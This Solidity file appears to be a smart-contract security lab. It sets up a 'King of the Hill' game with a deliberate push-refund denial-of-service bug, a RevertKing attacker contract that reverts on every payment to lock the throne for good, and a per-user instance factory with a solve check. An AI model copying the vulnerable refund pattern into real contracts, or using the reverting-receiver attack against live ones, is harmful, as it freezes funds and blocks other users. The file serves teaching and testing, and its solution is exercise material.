// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

import {SolvableBase} from "@common/SolvableBase.sol";

/// @notice "King of the Hill" with the classic push-payment DoS shape.
///         To dethrone the current king, you must refund their previous
///         bid via a low-level call AND require the refund to succeed.
///         If the king is a contract that reverts on receive, no one
///         can ever outbid them — the throne is locked.
contract KingOfHill {
    address public currentKing;
    uint256 public currentBid;

    event NewKing(address indexed king, uint256 bid);

    function bid() external payable {
        require(msg.value > currentBid, "bid too low");
        // BUG: require(ok) on a push refund. A reverting receiver bricks the game.
        if (currentKing != address(0)) {
            (bool ok,) = currentKing.call{value: currentBid}("");
            require(ok, "refund failed");
        }
        currentKing = msg.sender;
        currentBid = msg.value;
        emit NewKing(msg.sender, msg.value);
    }

    receive() external payable {}
}

/// @notice Per-user attacker. Refuses every refund. Once it becomes king,
///         the throne is permanently locked because no future bidder can
///         successfully refund it.
contract RevertKing {
    KingOfHill public immutable target;
    address public immutable owner;

    error AlwaysReverts();

    constructor(KingOfHill t, address o) {
        target = t;
        owner = o;
    }

    function takeThrone() external payable {
        require(msg.sender == owner, "only owner");
        target.bid{value: msg.value}();
    }

    receive() external payable {
        revert AlwaysReverts();
    }

    fallback() external payable {
        revert AlwaysReverts();
    }
}

/// @notice Multi-tenant DoS lab. Each user gets a personal (king-of-hill,
///         attacker) pair via `createInstance()`. The user makes an
///         opening bid from their EOA, then dethrones themselves via the
///         attacker — at which point the throne is locked.
contract DosLab is SolvableBase {
    struct Instance {
        KingOfHill king;
        RevertKing attacker;
    }

    mapping(address => Instance) private _instances;

    event InstanceCreated(address indexed user, address king, address attacker);

    function createInstance() external returns (address kingAddr, address attackerAddr) {
        require(address(_instances[msg.sender].king) == address(0), "already created");

        KingOfHill k = new KingOfHill();
        RevertKing a = new RevertKing(k, msg.sender);

        _instances[msg.sender] = Instance(k, a);
        emit InstanceCreated(msg.sender, address(k), address(a));
        return (address(k), address(a));
    }

    function kingOf(address user) external view returns (KingOfHill) {
        return _instances[user].king;
    }

    function attackerOf(address user) external view returns (RevertKing) {
        return _instances[user].attacker;
    }

    /// @notice Solved when the user's RevertKing sits on the throne — at
    ///         that point any third party calling `king.bid(...)` reverts
    ///         with `"refund failed"`.
    function isSolved(address user) public view override returns (bool) {
        Instance memory inst = _instances[user];
        if (address(inst.king) == address(0)) return false;
        return inst.king.currentKing() == address(inst.attacker);
    }
}
